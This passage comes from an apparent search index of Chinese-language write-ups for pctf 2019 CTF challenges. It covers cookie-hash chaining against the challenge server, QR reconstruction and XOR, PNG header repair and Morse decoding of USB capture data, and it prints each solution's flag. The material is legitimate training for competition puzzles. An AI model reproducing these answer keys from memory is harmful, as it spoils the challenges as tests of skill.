...\u6211\u8fd8\u662f\u91cd\u65b0\u8bf4\u4e00\u904d\u5427\uff0c\u521a\u5f00\u59cb\u6ca1\u6709Cookie\uff0c\u670d\u52a1\u5668\u4f1a\u8fd4\u56deSet-Cookie\u662fpc\u7684\u54c8\u5e0c\u503c\uff08bc54\u5f00\u5934\u7684\uff09\uff0c\u7136\u540e\u6d4f\u89c8\u5668\u518d\u6b21\u8bf7\u6c42\u8fd9\u4e2a\u9875\u9762\u5c31\u4f1a\u5e26\u4e0abc54\u5f00\u5934\u7684Cookie\uff0c\u8fd9\u65f6\u5019\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56depc\u7684\u540e\u4e24\u4f4d\u4e5f\u5c31\u662ftf\u7684\u54c8\u5e0c\u503c\uff08114d\u5f00\u5934\u7684\uff09\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u76f4\u5230\u53c8\u51fa\u73b0pc\u7684\u54c8\u5e0c\u503c\u5c31\u53ef\u4ee5\u505c\u4e0b\u4e86\u3002 \u4e8e\u662f\u4e4e\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 import requests headers = { 'Cookie' : 'flag=bc54f4d60f1cec0f9a6cb70e13f2127a' } while True : print ( headers [ 'Cookie' ]) res = requests . get ( 'http://159.89.166.12:13500/' , headers = headers ) headers [ 'Cookie' ] = res . headers [ 'Set-Cookie' ] if headers [ 'Cookie' ] == 'flag=bc54f4d60f1cec0f9a6cb70e13f2127a' : break \u5e94\u8be5\u80fd\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 flag = bc54f4d60f1cec0f9a6cb70e13f2127a flag = 114 d6a415b3d04db792ca7c0da0c7a55 flag = b2984e12969ad3a3a2a4d334b8fb385a flag = 6 f570c477ab64d17825ef2d2dfcb6fe4 flag = 988287 f7a1eb966ffc4e19bdbdeec7c3 flag = 0 d4896d431044c92de2840ed53b6fbbd flag = f355d719add62ceea8c150e5fbfae819 flag = 12 eccbdd9b32918131341f38907cbbb5 flag = 639307 d281416ad0642faeaae1f098c4 flag = 96 bc320e4d72edda450c7a9abc8a214f flag = c716fb29298ad96a3b31757ec9755763 flag = 51 de5514f3c808babd19f42217fcba49 flag = 05 cb7dc333ca611d0a8969704e39a9f0 flag = bc781c76baf5589eef4fb7b9247b89a0 flag = ff108b961a844f859bd7c203b7366f8e flag = 2349277280263 dff980b0c8a4a10674b flag = 0 b1cdc9fe1f929e469c5a54ffe0b2ed5 flag = 364641 d04574146d9f88001e66b4410f flag = c758807125330006a4375357104f9a82 flag = fcfdc12fb4030a8c8a2e19cf7b075926 flag = 440 c5c247c708c6e46783e47e3986889 flag = 97 a7bf81a216e803adfed8bd013f4b85 flag = c1d12de20210d8c1b35c367536e1c255 flag = a8655da06c5080d3f1eb6af7b514e309 \u4e00\u4e2a\u4e2a\u53bb\u641c\u597d\u50cf\u4e5f\u4e0d\u662f\u4ec0\u4e48\u5927\u95ee\u9898\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u5199\u4e2a\u811a\u672c\u751f\u6210\u5b57\u5178\uff0c\u6bd5\u7adf\u90fd\u662f\u4e24\u4f4d\u5b57\u7b26\u7684\u54c8\u5e0c\u503c\u3002\u6700\u540e\u5f97\u5230\uff1a 1 pctf { c0oki3s_ @re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t }","title":"Cookie Monster"},{"location":"ctf_writeup/pctf_2019/cookie_monster/#_1","text":"Do prepare to see cookies lurking everywhere. http://159.89.166.12:13500/","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/cookie_monster/#_2","text":"\u6253\u5f00\u7f51\u9875\u540e\uff0c\u611f\u89c9\u90fd\u5728\u63d0Cookie\uff0cF12\u6253\u5f00\u5f00\u53d1\u8005\u5de5\u5177\u770b\u770bCookie\u3002\u80fd\u53d1\u73b0\u54cd\u5e94\u5934\u7684Set-Cookie\u5728\u53d8\u5316\uff0c\u5e76\u4e14\u67e5\u5230\u524d\u4e24\u4e2a\u5206\u522b\u662fpc\u548ctf\u7684\u54c8\u5e0c\u503c\uff1a bc54f4d60f1cec0f9a6cb70e13f2127a 114d6a415b3d04db792ca7c0da0c7a55 \u5e94\u8be5\u662fflag\u6bcf\u4e24\u4e2a\u5b57\u7b26\u53bb\u54c8\u5e0c\uff0c\u7136\u540e\u6bcf\u6b21\u54cd\u5e94\u5934\u7684Set-Cookie\uff0c\u662f\u8bf7\u6c42\u5934\u7684Cookie\u5bf9\u5e94\u4e24\u4f4d\u5b57\u7b26\u7684\u540e\u4e24\u4f4d\u5b57\u7b26\u7684\u54c8\u5e0c\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u8981\u4e0d\u65ad\u62ff\u8fd4\u56de\u7684\u65b0Cookie\u53bb\u8bf7\u6c42\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230\u5168\u90e8\uff08\u6211\u5728\u8bf4\u4ec0\u4e48\u73a9\u610f\u513f\uff09\u3002 ...\u6211\u8fd8\u662f\u91cd\u65b0\u8bf4\u4e00\u904d\u5427\uff0c\u521a\u5f00\u59cb\u6ca1\u6709Cookie\uff0c\u670d\u52a1\u5668\u4f1a\u8fd4\u56deSet-Cookie\u662fpc\u7684\u54c8\u5e0c\u503c\uff08bc54\u5f00\u5934\u7684\uff09\uff0c\u7136\u540e\u6d4f\u89c8\u5668\u518d\u6b21\u8bf7\u6c42\u8fd9\u4e2a\u9875\u9762\u5c31\u4f1a\u5e26\u4e0abc54\u5f00\u5934\u7684Cookie\uff0c\u8fd9\u65f6\u5019\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56depc\u7684\u540e\u4e24\u4f4d\u4e5f\u5c31\u662ftf\u7684\u54c8\u5e0c\u503c\uff08114d\u5f00\u5934\u7684\uff09\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u76f4\u5230\u53c8\u51fa\u73b0pc\u7684\u54c8\u5e0c\u503c\u5c31\u53ef\u4ee5\u505c\u4e0b\u4e86\u3002 \u4e8e\u662f\u4e4e\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 import requests headers = { 'Cookie' : 'flag=bc54f4d60f1cec0f9a6cb70e13f2127a' } while True : print ( headers [ 'Cookie' ]) res = requests . get ( 'http://159.89.166.12:13500/' , headers = headers ) headers [ 'Cookie' ] = res . headers [ 'Set-Cookie' ] if headers [ 'Cookie' ] == 'flag=bc54f4d60f1cec0f9a6cb70e13f2127a' : break \u5e94\u8be5\u80fd\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 flag = bc54f4d60f1cec0f9a6cb70e13f2127a flag = 114 d6a415b3d04db792ca7c0da0c7a55 flag = b2984e12969ad3a3a2a4d334b8fb385a flag = 6 f570c477ab64d17825ef2d2dfcb6fe4 flag = 988287 f7a1eb966ffc4e19bdbdeec7c3 flag = 0 d4896d431044c92de2840ed53b6fbbd flag = f355d719add62ceea8c150e5fbfae819 flag = 12 eccbdd9b32918131341f38907cbbb5 flag = 639307 d281416ad0642faeaae1f098c4 flag = 96 bc320e4d72edda450c7a9abc8a214f flag = c716fb29298ad96a3b31757ec9755763 flag = 51 de5514f3c808babd19f42217fcba49 flag = 05 cb7dc333ca611d0a8969704e39a9f0 flag = bc781c76baf5589eef4fb7b9247b89a0 flag = ff108b961a844f859bd7c203b7366f8e flag = 2349277280263 dff980b0c8a4a10674b flag = 0 b1cdc9fe1f929e469c5a54ffe0b2ed5 flag = 364641 d04574146d9f88001e66b4410f flag = c758807125330006a4375357104f9a82 flag = fcfdc12fb4030a8c8a2e19cf7b075926 flag = 440 c5c247c708c6e46783e47e3986889 flag = 97 a7bf81a216e803adfed8bd013f4b85 flag = c1d12de20210d8c1b35c367536e1c255 flag = a8655da06c5080d3f1eb6af7b514e309 \u4e00\u4e2a\u4e2a\u53bb\u641c\u597d\u50cf\u4e5f\u4e0d\u662f\u4ec0\u4e48\u5927\u95ee\u9898\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u5199\u4e2a\u811a\u672c\u751f\u6210\u5b57\u5178\uff0c\u6bd5\u7adf\u90fd\u662f\u4e24\u4f4d\u5b57\u7b26\u7684\u54c8\u5e0c\u503c\u3002\u6700\u540e\u5f97\u5230\uff1a 1 pctf { c0oki3s_ @re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/exorcism/","text":"\u9898\u76ee My friend Alex needs your help very fast. He has been possessed by a ghost and the only way to save him is if you tell the flag to the ghost. Hurry up, time is running out! Hint: We need a very quick response from you so that you can save him from the ghost by exorcizing it with the flag. \u9898\u76ee\u5b58\u6863\uff1a encoded.txt \u89e3\u51b3\u65b9\u6848 \u4e0b\u8f7d\u5230\u4e00\u4e2a\u53ea\u67090\u548c1\u7684\u6587\u672c\u6587\u6863\uff0c\u521a\u597d10000\u884c\uff0c\u731c\u6d4b\u53ef\u80fd\u662f100\u00d7100\u7684\u5b57\u7b26\u753b\u3002\u4e8e\u662f\u4f7f\u7528OpenCV\u753b\u56fe\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include <iostream> #include <fstream> #include <opencv2/opencv.hpp> int main () { std :: ifstream inputFileStream ( \"./encoded.txt\" ); cv :: Mat qr ( 100 , 100 , CV_8UC1 ); for ( int ir = 0 ; ir < 100 ; ++ ir ) { for ( int ic = 0 ; ic < 100 ; ++ ic ) { uchar pixel ; inputFileStream >> pixel ; qr . at < uchar > ( ir , ic ) = ( pixel == '1' ? cv :: saturate_cast < uchar > ( 255 ) : cv :: saturate_cast < uchar > ( 0 )); } } cv :: imshow ( \"QR\" , qr ); cv :: imwrite ( \"./qr.png\" , qr ); cv :: waitKey ( 0 ); return 0 ; } \u5f97\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff1a \u626b\u7801\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a 1 160 f15011d1b095339595138535f135613595e1a \u9898\u76ee\u6807\u9898\u50cf\u662f\u63d0\u793a\u9700\u8981\u5f02\u6216\uff0c\u53d7\u62a4\u7f51\u676f2018-\u8fdf\u6765\u7684\u7b7e\u5230\u9898\u542f\u53d1\uff0c\u6211\u4eec\u5148\u5c06\u524d5\u4f4d\u548c pctf{ \u5f02\u6216\uff1a 0001 0110 0000 1111 0001 0101 0000 0001 0001 1101 - 160f15011d 0111 0000 0110 0011 0111 0100 0110 0110 0111 1011 - pctf{ 0110 0110 0110 1100 0110 0001 0110 0111 0110 0110 - flagf \u6709\u53d1\u73b0\uff01\u7adf\u7136\u51fa\u73b0\u4e86 flag \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4e5f\u8bb8\u6211\u4eec\u53ea\u9700\u8981\u628a\u5b57\u7b26\u4e32\u548cflag\u5f02\u6216\u5c31\u4f1a\u6709\u7b54\u6848\uff1a","title":"EXORcism"},{"location":"ctf_writeup/pctf_2019/exorcism/#_1","text":"My friend Alex needs your help very fast. He has been possessed by a ghost and the only way to save him is if you tell the flag to the ghost. Hurry up, time is running out! Hint: We need a very quick response from you so that you can save him from the ghost by exorcizing it with the flag. \u9898\u76ee\u5b58\u6863\uff1a encoded.txt","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/exorcism/#_2","text":"\u4e0b\u8f7d\u5230\u4e00\u4e2a\u53ea\u67090\u548c1\u7684\u6587\u672c\u6587\u6863\uff0c\u521a\u597d10000\u884c\uff0c\u731c\u6d4b\u53ef\u80fd\u662f100\u00d7100\u7684\u5b57\u7b26\u753b\u3002\u4e8e\u662f\u4f7f\u7528OpenCV\u753b\u56fe\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include <iostream> #include <fstream> #include <opencv2/opencv.hpp> int main () { std :: ifstream inputFileStream ( \"./encoded.txt\" ); cv :: Mat qr ( 100 , 100 , CV_8UC1 ); for ( int ir = 0 ; ir < 100 ; ++ ir ) { for ( int ic = 0 ; ic < 100 ; ++ ic ) { uchar pixel ; inputFileStream >> pixel ; qr . at < uchar > ( ir , ic ) = ( pixel == '1' ? cv :: saturate_cast < uchar > ( 255 ) : cv :: saturate_cast < uchar > ( 0 )); } } cv :: imshow ( \"QR\" , qr ); cv :: imwrite ( \"./qr.png\" , qr ); cv :: waitKey ( 0 ); return 0 ; } \u5f97\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff1a \u626b\u7801\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a 1 160 f15011d1b095339595138535f135613595e1a \u9898\u76ee\u6807\u9898\u50cf\u662f\u63d0\u793a\u9700\u8981\u5f02\u6216\uff0c\u53d7\u62a4\u7f51\u676f2018-\u8fdf\u6765\u7684\u7b7e\u5230\u9898\u542f\u53d1\uff0c\u6211\u4eec\u5148\u5c06\u524d5\u4f4d\u548c pctf{ \u5f02\u6216\uff1a 0001 0110 0000 1111 0001 0101 0000 0001 0001 1101 - 160f15011d 0111 0000 0110 0011 0111 0100 0110 0110 0111 1011 - pctf{ 0110 0110 0110 1100 0110 0001 0110 0111 0110 0110 - flagf \u6709\u53d1\u73b0\uff01\u7adf\u7136\u51fa\u73b0\u4e86 flag \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4e5f\u8bb8\u6211\u4eec\u53ea\u9700\u8981\u628a\u5b57\u7b26\u4e32\u548cflag\u5f02\u6216\u5c31\u4f1a\u6709\u7b54\u6848\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/game_of_faces/","text":"\u9898\u76ee The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue. http://159.89.166.12:15000/ \u89e3\u51b3\u65b9\u6848 \u6253\u5f00\u7f51\u9875\uff0c\u6709\u4e09\u4e2a\u8272\u5757\uff0c\u6682\u65f6\u770b\u4e0d\u5230\u5176\u5b83\u5185\u5bb9\u3002Ctrl+U\u67e5\u770b\u6e90\u7801\uff0c\u6709\u53d1\u73b0\uff1a 1 2 3 4 < form action = '#' method = \"GET\" target = \"resultFrame\" > Upload Your Profile Picture : < input type = \"file\" name = \"profile_pic\" > < input type = \"submit\" value = \"Upload Image\" name = \"submit\" > </ form > \u7adf\u7136\u6709\u4e2a\u4e0a\u4f20\u6587\u4ef6\u7684\u8868\u5355\u3002\u968f\u4fbf\u9009\u4e86\u4e2a\u6587\u4ef6\u4e0a\u4f20\uff0c\u8df3\u8f6c\u5230\u4e00\u4e2a\u65b0\u9875\u9762\uff0c\u6709\u4e2a\u5b57\u7b26\u4e32\uff1a VGhlX3Njcm9sbF9zYXlzPXRoZV9uaWdodF9raW5nVlN2YWx5cmlhbi50eHQ== The scroll says=the night kingVSvalyrian.txt \u5c1d\u8bd5\u8bf7\u6c42the night kingVSvalyrian.txt\uff1a 1 pctf { You_L00K_Wi3Rd_IN_H3R3 }","title":"Game of Faces"},{"location":"ctf_writeup/pctf_2019/game_of_faces/#_1","text":"The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue. http://159.89.166.12:15000/","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/game_of_faces/#_2","text":"\u6253\u5f00\u7f51\u9875\uff0c\u6709\u4e09\u4e2a\u8272\u5757\uff0c\u6682\u65f6\u770b\u4e0d\u5230\u5176\u5b83\u5185\u5bb9\u3002Ctrl+U\u67e5\u770b\u6e90\u7801\uff0c\u6709\u53d1\u73b0\uff1a 1 2 3 4 < form action = '#' method = \"GET\" target = \"resultFrame\" > Upload Your Profile Picture : < input type = \"file\" name = \"profile_pic\" > < input type = \"submit\" value = \"Upload Image\" name = \"submit\" > </ form > \u7adf\u7136\u6709\u4e2a\u4e0a\u4f20\u6587\u4ef6\u7684\u8868\u5355\u3002\u968f\u4fbf\u9009\u4e86\u4e2a\u6587\u4ef6\u4e0a\u4f20\uff0c\u8df3\u8f6c\u5230\u4e00\u4e2a\u65b0\u9875\u9762\uff0c\u6709\u4e2a\u5b57\u7b26\u4e32\uff1a VGhlX3Njcm9sbF9zYXlzPXRoZV9uaWdodF9raW5nVlN2YWx5cmlhbi50eHQ== The scroll says=the night kingVSvalyrian.txt \u5c1d\u8bd5\u8bf7\u6c42the night kingVSvalyrian.txt\uff1a 1 pctf { You_L00K_Wi3Rd_IN_H3R3 }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/late_pr/","text":"\u9898\u76ee MarioJones is studying grade 10. He was submitting his school Assignment when something weird happened and his computer shut down without any warning. Can you help him ? https://bit.ly/2J3jIe1 \u89e3\u51b3\u65b9\u6848 \u975e\u9884\u671f\u4e86\u5427...","title":"Late PR"},{"location":"ctf_writeup/pctf_2019/late_pr/#_1","text":"MarioJones is studying grade 10. He was submitting his school Assignment when something weird happened and his computer shut down without any warning. Can you help him ? https://bit.ly/2J3jIe1","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/late_pr/#_2","text":"\u975e\u9884\u671f\u4e86\u5427...","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/magic_pngs/","text":"\u9898\u76ee Magic PNGs: Can you help me open this zip file? I seem to have forgotten its password. I think the image file has something to do with it. Hint: You may have to hash the secret word to get the flag... \u9898\u76ee\u5b58\u6863\uff1a tryme.zip you cant see_me.png \u89e3\u51b3\u65b9\u6848 \u4e0b\u8f7d\u5230\u4e00\u4e2atryme.zip\u548c\u4e00\u4e2ayou cant see_me.png\uff0c\u538b\u7f29\u5305\u5185\u542bflag.txt\u4f46\u662f\u88ab\u52a0\u5bc6\u4e86\uff1bpng\u6253\u4e0d\u5f00\uff0c\u8fd8\u5632\u8bbd\u6211\uff08\uff1f\uff09\uff0c\u5148\u770b\u4e00\u4e0b\u5341\u516d\u8fdb\u5236\uff1a 1 2 vim - b you_cant_see_me . png : %! xxd \u7136\u540e\u53d1\u73b0\u6587\u4ef6\u5934\u6709\u95ee\u9898\uff1b\u800c\u4e14\u7adf\u7136\u6ca1\u6709IDAT\uff0c\u4f30\u8ba1\u662f\u88ab\u7834\u574f\u4e86\uff0c\u4e0d\u8fc7\u7adf\u7136\u80fd\u641c\u5230\u4e00\u4e2a\u5c0f\u5199\u7684idat\uff0c\u786e\u8ba4\u8fc7\u773c\u795e\uff0c\u662f\u5e94\u8be5\u6539\u7684\u5730\u65b9\u3002\u6539\u56de\u6765\u4fdd\u5b58\u770b\u770b\uff1a 1 2 : %! xxd - r : wq \u5df2\u7ecf\u53ef\u4ee5\u9884\u89c8\u56fe\u7247\u4e86\uff1a \u6253\u5f00\uff1a \u884c\u5427\u65cb\u8f6c\u4e00\u4e0b\uff1a \u61d2\u5f97\u5199\u4e2a\u955c\u50cf\u4e86\uff0c\u76f4\u63a5\u62ff\u624b\u673a\u524d\u6444\u62cd\u4e86\u4e00\u5f20\u5c31\u53ef\u4ee5\u770b\u5230\u6b63\u7684\u4e86\uff1a 1 h4CK3RM4n \u9898\u76eehint\u8868\u793a\u5e94\u8be5\u5148\u54c8\u5e0c\u4e00\u4e0b\u518dtry\u4e00\u4e0b\uff1a 1 2 c919f82ee2ed6985d5c5e275d67e4f8 \u89e3\u538bflag.txt\u6210\u529fget\u5230flag\uff1a 1 pctf { y0u_s33_m33_n0w ! }","title":"Magic PNGs"},{"location":"ctf_writeup/pctf_2019/magic_pngs/#_1","text":"Magic PNGs: Can you help me open this zip file? I seem to have forgotten its password. I think the image file has something to do with it. Hint: You may have to hash the secret word to get the flag... \u9898\u76ee\u5b58\u6863\uff1a tryme.zip you cant see_me.png","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/magic_pngs/#_2","text":"\u4e0b\u8f7d\u5230\u4e00\u4e2atryme.zip\u548c\u4e00\u4e2ayou cant see_me.png\uff0c\u538b\u7f29\u5305\u5185\u542bflag.txt\u4f46\u662f\u88ab\u52a0\u5bc6\u4e86\uff1bpng\u6253\u4e0d\u5f00\uff0c\u8fd8\u5632\u8bbd\u6211\uff08\uff1f\uff09\uff0c\u5148\u770b\u4e00\u4e0b\u5341\u516d\u8fdb\u5236\uff1a 1 2 vim - b you_cant_see_me . png : %! xxd \u7136\u540e\u53d1\u73b0\u6587\u4ef6\u5934\u6709\u95ee\u9898\uff1b\u800c\u4e14\u7adf\u7136\u6ca1\u6709IDAT\uff0c\u4f30\u8ba1\u662f\u88ab\u7834\u574f\u4e86\uff0c\u4e0d\u8fc7\u7adf\u7136\u80fd\u641c\u5230\u4e00\u4e2a\u5c0f\u5199\u7684idat\uff0c\u786e\u8ba4\u8fc7\u773c\u795e\uff0c\u662f\u5e94\u8be5\u6539\u7684\u5730\u65b9\u3002\u6539\u56de\u6765\u4fdd\u5b58\u770b\u770b\uff1a 1 2 : %! xxd - r : wq \u5df2\u7ecf\u53ef\u4ee5\u9884\u89c8\u56fe\u7247\u4e86\uff1a \u6253\u5f00\uff1a \u884c\u5427\u65cb\u8f6c\u4e00\u4e0b\uff1a \u61d2\u5f97\u5199\u4e2a\u955c\u50cf\u4e86\uff0c\u76f4\u63a5\u62ff\u624b\u673a\u524d\u6444\u62cd\u4e86\u4e00\u5f20\u5c31\u53ef\u4ee5\u770b\u5230\u6b63\u7684\u4e86\uff1a 1 h4CK3RM4n \u9898\u76eehint\u8868\u793a\u5e94\u8be5\u5148\u54c8\u5e0c\u4e00\u4e0b\u518dtry\u4e00\u4e0b\uff1a 1 2 c919f82ee2ed6985d5c5e275d67e4f8 \u89e3\u538bflag.txt\u6210\u529fget\u5230flag\uff1a 1 pctf { y0u_s33_m33_n0w ! }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/save_earth/","text":"\u9898\u76ee In the mid 21 st century, Ex-NASA pilot Cooper leaves his little daughter and goes an interstellar journey around the space to find an alternative planet (PLAN A) or to capture gravitational data and send it back to earth, which Scientists will use to save Earth. However Cooper finds himself stuck in a tesseract that spans across time, there is only one way he could transmit the data to his little girl. We have obtained parts of what Cooper sent to his daughter, can you find the flag and save the earth? Note: This question does not follow the flag format \u9898\u76ee\u5b58\u6863\uff1a SaveEarth.pcap \u89e3\u51b3\u65b9\u6848 \u6211\u5df2\u7ecf\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u89e3\u91ca\u4e86\uff0c\u53cd\u6b63\u6211\u505a\u4e0d\u51fa\u6765...\u7ffb\u8fc7\u534f\u8bae\u7684\u6587\u6863\uff0c\u4e5f\u5c1d\u8bd5\u8fc7\u5404\u79cd\u529e\u6cd5\u90fd\u6ca1\u6709\u6536\u83b7\u3002\u8d5b\u540e\u770b\u522b\u4eba\u7684\u6587\u7ae0\uff0c\u53d1\u73b0\u9700\u8981\u5173\u6ce8\u6570\u636e\u5305\u4e2d\u7684Leftover Capture Data\u3002\u4e8e\u662f\uff1a 1 tshark - r / mnt / c / Users / domain / CTF / pctf2019 / SaveEarth . pcap - V | grep \"Leftover Capture Data\" \u5c31\u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0102000000000000 \u53ef\u4ee5\u5c1d\u8bd5\u6469\u65af\u7535\u7801\uff0c\u4e8e\u662f\u628a\u4e0a\u6587\u4e2d\u76840101\u5f53\u4f5c\u7a7a\u683c\uff0c\u628a0102\u5f53\u4f5c-\uff0c\u628a0104\u5f53\u4f5c.\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <iostream> int main () { while ( ! std :: cin . eof ()) { char buf [ 64 ] = {}; std :: cin . getline ( buf , 64 ); std :: string string ( buf ); switch ( string [ 26 ]) { case '1' : std :: cout << ' ' ; break ; case '2' : std :: cout << '-' ; break ; case '4' : std :: cout << '.' ; break ; default : ; } } return 0 ; } \u53ef\u4ee5\u5f97\u5230\uff1a 1 - . - . - .. - . ... .... - ... - ... -- \u89e3\u5f97\uff1a 1 CTFS4V3 \u8fd9\u4e2a...\u6bd5\u7adf\u662f\u8d5b\u540e\u590d\u73b0\uff0c\u6ca1\u6709\u63d0\u4ea4\u8fc7\uff0c\u8981\u662f\u51fa\u73b0\u4ec0\u4e48\u5dee\u9519\u9ebb\u70e6\u544a\u8bc9\u6211...","title":"Save Earth"},{"location":"ctf_writeup/pctf_2019/save_earth/#_1","text":"In the mid 21 st century, Ex-NASA pilot Cooper leaves his little daughter and goes an interstellar journey around the space to find an alternative planet (PLAN A) or to capture gravitational data and send it back to earth, which Scientists will use to save Earth. However Cooper finds himself stuck in a tesseract that spans across time, there is only one way he could transmit the data to his little girl. We have obtained parts of what Cooper sent to his daughter, can you find the flag and save the earth? Note: This question does not follow the flag format \u9898\u76ee\u5b58\u6863\uff1a SaveEarth.pcap","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/save_earth/#_2","text":"\u6211\u5df2\u7ecf\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u89e3\u91ca\u4e86\uff0c\u53cd\u6b63\u6211\u505a\u4e0d\u51fa\u6765...\u7ffb\u8fc7\u534f\u8bae\u7684\u6587\u6863\uff0c\u4e5f\u5c1d\u8bd5\u8fc7\u5404\u79cd\u529e\u6cd5\u90fd\u6ca1\u6709\u6536\u83b7\u3002\u8d5b\u540e\u770b\u522b\u4eba\u7684\u6587\u7ae0\uff0c\u53d1\u73b0\u9700\u8981\u5173\u6ce8\u6570\u636e\u5305\u4e2d\u7684Leftover Capture Data\u3002\u4e8e\u662f\uff1a 1 tshark - r / mnt / c / Users / domain / CTF / pctf2019 / SaveEarth . pcap - V | grep \"Leftover Capture Data\" \u5c31\u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0101000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0104000000000000 Leftover Capture Data : 0102000000000000 Leftover Capture Data : 0102000000000000 \u53ef\u4ee5\u5c1d\u8bd5\u6469\u65af\u7535\u7801\uff0c\u4e8e\u662f\u628a\u4e0a\u6587\u4e2d\u76840101\u5f53\u4f5c\u7a7a\u683c\uff0c\u628a0102\u5f53\u4f5c-\uff0c\u628a0104\u5f53\u4f5c.\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <iostream> int main () { while ( ! std :: cin . eof ()) { char buf [ 64 ] = {}; std :: cin . getline ( buf , 64 ); std :: string string ( buf ); switch ( string [ 26 ]) { case '1' : std :: cout << ' ' ; break ; case '2' : std :: cout << '-' ; break ; case '4' : std :: cout << '.' ; break ; default : ; } } return 0 ; } \u53ef\u4ee5\u5f97\u5230\uff1a 1 - . - . - .. - . ... .... - ... - ... -- \u89e3\u5f97\uff1a 1 CTFS4V3 \u8fd9\u4e2a...\u6bd5\u7adf\u662f\u8d5b\u540e\u590d\u73b0\uff0c\u6ca1\u6709\u63d0\u4ea4\u8fc7\uff0c\u8981\u662f\u51fa\u73b0\u4ec0\u4e48\u5dee\u9519\u9ebb\u70e6\u544a\u8bc9\u6211...","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/slow_realization/","text":"\u9898\u76ee Ryan's friend has hidden something in this image and challenged his to find it out. Can you help him recover the secret 